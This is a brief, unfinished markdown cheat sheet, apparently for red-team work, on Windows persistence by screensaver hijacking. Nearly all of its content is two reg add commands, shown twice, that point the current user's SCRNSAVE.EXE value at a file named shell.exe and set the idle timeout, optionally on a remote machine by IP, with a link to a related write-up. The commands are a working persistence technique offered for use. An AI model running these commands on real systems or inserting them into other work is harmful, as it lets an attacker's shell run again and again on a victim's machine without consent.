# Living off the Land

TODO: Refer to the link

## 01 - Command Prompt

```
C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "<seconds>" /f
```

## 02 - Powershell

TODO: Convert the commands to cmdlets

```
C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "<seconds>" /f
```

---
## References

- [austin-lai: Persistence through Windows Screensaver Hijacking](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking)